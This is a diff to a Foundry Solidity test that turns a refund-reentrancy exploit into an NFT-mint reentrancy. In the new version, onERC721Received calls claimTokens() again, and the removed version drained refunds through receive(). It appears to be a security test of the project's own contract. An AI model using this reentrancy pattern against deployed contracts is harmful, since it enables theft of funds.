@@ -6,8 +6,9 @@ import "../src/Project.sol";
 
 import "forge-std/console.sol";
 import "forge-std/test.sol";
+import "openzeppelin/token/ERC721/IERC721Receiver.sol";
 
-contract TestReentrancy is Test {
+contract TestReentrancyMint is Test, IERC721Receiver {
 
     Project project;
     uint iterations = 0;
@@ -20,21 +21,20 @@ contract TestReentrancy is Test {
     }
 
     function testReentrancy() public { 
-        vm.deal(address(this), 0.02 ether);
-        project.contribute{value: 0.02 ether}();
-        vm.warp(block.timestamp + 31 days); // warp to after deadline
-        project.refund();
+        vm.deal(address(this), 1 ether);
+        project.contribute{value: 1 ether}();
+        project.claimTokens();
 
-        assertTrue((address(this).balance > 0.02 ether), "We should have earned some eth");
 
     }
 
-    receive() external payable {
-        console.log('current balance = ', address(this).balance);
-        try project.refund() {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data
+) external  returns (bytes4) {
+
+        try  project.claimTokens(){
 
         } catch (bytes memory) {
-            return;
+            return bytes4(0);
         }
     }
 }
